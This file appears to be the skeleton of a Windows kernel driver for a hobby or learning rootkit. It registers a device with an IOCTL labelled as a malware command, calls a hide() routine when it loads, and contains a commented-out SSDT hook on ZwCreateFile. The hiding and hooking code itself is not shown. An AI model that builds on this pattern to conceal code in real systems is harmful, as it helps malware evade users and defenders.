#pragma once
#include <pch.h>

#define SUGIOT2 0x8001
#define IOCTL_SUGIOT1_MALWARE_COMMAND CTL_CODE(SUGIOT2, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HookFuncName "ZwCreateFile"

NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP Irp)
{
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_SUGIOT1_MALWARE_COMMAND:
	{

		DbgPrint("Malicious Command\n");
		break;
	}
	default:
	{
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}
	}
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;

}

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

void SugiotUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	//UnHookSSDT(HookFuncName);
	unhide();
	UNICODE_STRING sym_link = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
	IoDeleteSymbolicLink(&sym_link);

	IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Sugiot2 driver unload\n");
}

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistyPath)
{
	UNREFERENCED_PARAMETER(RegistyPath);
	
	DriverObject->DriverUnload = SugiotUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;

	UNICODE_STRING dev_name;
	RtlInitUnicodeString(&dev_name, L"\\Device\\Sugiot2");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &dev_name, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	  
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Failed to create Device object\n");
		return status;
	}
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Sugiot2");
	status = IoCreateSymbolicLink(&symLink, &dev_name);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Failed to create symbolic link");
		return status;
	}
	
	//printProcessList();
	DbgPrint("Driver Load\n");
	//HookSSDT(HookFuncName);
	hide();
	printProcessList();
	return STATUS_SUCCESS;  

} 


